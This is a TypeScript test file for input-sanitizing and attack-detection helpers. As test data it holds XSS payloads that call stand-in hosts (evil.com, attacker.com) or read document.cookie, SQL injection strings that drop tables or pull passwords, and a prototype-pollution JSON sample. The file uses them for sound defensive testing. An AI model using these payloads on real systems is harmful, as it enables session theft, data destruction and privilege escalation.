import test from 'node:test';
import assert from 'node:assert/strict';
import {
  sanitizeInput,
  escapeHtml,
  containsXSSPayload,
  containsSQLiPattern,
  safeJsonParse,
} from './security';

test('sanitizeInput neutralizes dangerous XSS script tags and control characters', () => {
  const payload = "<script>alert('XSS')</script>Hello Trever\x00\x08World";
  const result = sanitizeInput(payload);
  assert.equal(result.includes('<script>'), false);
  assert.equal(result.includes('\x00'), false);
  assert.equal(result.includes('World'), true);
});

test('sanitizeInput strips inline event handlers and javascript pseudo-protocol', () => {
  const evil1 = '<img src=x onerror=alert(1)>';
  assert.equal(sanitizeInput(evil1).includes('onerror'), false);

  const evil2 = 'javascript:alert(document.cookie)';
  assert.equal(sanitizeInput(evil2).includes('javascript:'), false);
});

test('sanitizeInput clamps maximum input length to prevent payload bloat', () => {
  const longStr = 'A'.repeat(5000);
  const sanitized = sanitizeInput(longStr, 250);
  assert.equal(sanitized.length, 250);
});

test('sanitizeInput handles null, undefined, and numbers safely', () => {
  assert.equal(sanitizeInput(null), '');
  assert.equal(sanitizeInput(undefined), '');
  assert.equal(sanitizeInput(12345), '12345');
});

test('escapeHtml converts special HTML characters to safe entities', () => {
  const raw = '<div class="quote" data-test=\'foo\'>& special</div>';
  const escaped = escapeHtml(raw);
  assert.equal(escaped, '&lt;div class=&quot;quote&quot; data-test=&#39;foo&#39;&gt;&amp; special&lt;/div&gt;');
});

test('containsXSSPayload correctly flags dangerous injection attempts', () => {
  assert.equal(containsXSSPayload('<script src="http://evil.com/x.js"></script>'), true);
  assert.equal(containsXSSPayload('<img src="x" onerror="alert(1)">'), true);
  assert.equal(containsXSSPayload('<svg onload="fetch(\'http://attacker.com\')">'), true);
  assert.equal(containsXSSPayload('javascript:void(0)'), true);
  assert.equal(containsXSSPayload('normal user message with punctuation!'), false);
  assert.equal(containsXSSPayload('We need an enterprise platform with 99.9% uptime.'), false);
});

test('containsSQLiPattern detects classic injection attacks', () => {
  assert.equal(containsSQLiPattern("' OR 1=1 --"), true);
  assert.equal(containsSQLiPattern("admin'; DROP TABLE users; --"), true);
  assert.equal(containsSQLiPattern("UNION SELECT username, password FROM accounts"), true);
  assert.equal(containsSQLiPattern('Building a standard PostgreSQL database schema'), false);
});

test('safeJsonParse prevents prototype pollution and handles invalid JSON gracefully', () => {
  const maliciousJson = '{"__proto__": {"isAdmin": true}, "validKey": "Trever"}';
  const parsed = safeJsonParse<{ validKey: string; isAdmin?: boolean }>(maliciousJson, { validKey: 'fallback' });
  assert.equal(parsed.validKey, 'Trever');
  assert.equal((Object.prototype as any).isAdmin, undefined);

  const brokenJson = '{ not valid json ::: }';
  const fallback = { status: 'safe' };
  assert.deepEqual(safeJsonParse(brokenJson, fallback), fallback);
  assert.deepEqual(safeJsonParse(null, fallback), fallback);
});
